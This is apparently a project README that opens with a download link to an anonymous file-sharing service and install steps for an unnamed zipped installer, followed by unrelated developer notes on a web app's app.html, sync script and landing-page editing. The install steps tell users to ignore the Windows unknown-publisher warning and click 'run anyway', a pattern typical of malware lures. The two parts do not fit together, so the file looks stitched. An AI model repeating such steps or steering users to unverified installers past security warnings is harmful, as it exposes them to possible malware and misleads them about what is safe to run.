## Download
[here](https://toffeeshare.com/c/M39-kYGdSI)

## steps after download:
1.extract zip
2.open installer
3.if windows says this is unknown just ignore and press more details -> run anyway
4.continue steps with installation proccess
5.ur done!

---

## app.html lives in the project root

`app.html` in the root of this project is the **single source of truth** for the
whole web app. Edit only that file.

The shell actually loads it from `MatixTheMathClub/app.html`, so after editing the root file run:

```
node sync-app.js
```

### Startup order

1. **Loading screen** - dark, dotted grid, neon-green progress bar
2. **Welcome screen** - Google Labs style landing page
3. **Sign in** - only after the user taps "Try it now"

### Editing the landing copy

Sign in as an owner, then use **Edit this screen (owner)** on the welcome screen
(or the pencil button, bottom-right). Everything - wordmark, headline, cards,
category pills, social links - is saved to `/siteContent/gate` and applies for
everyone. No rebuild needed.
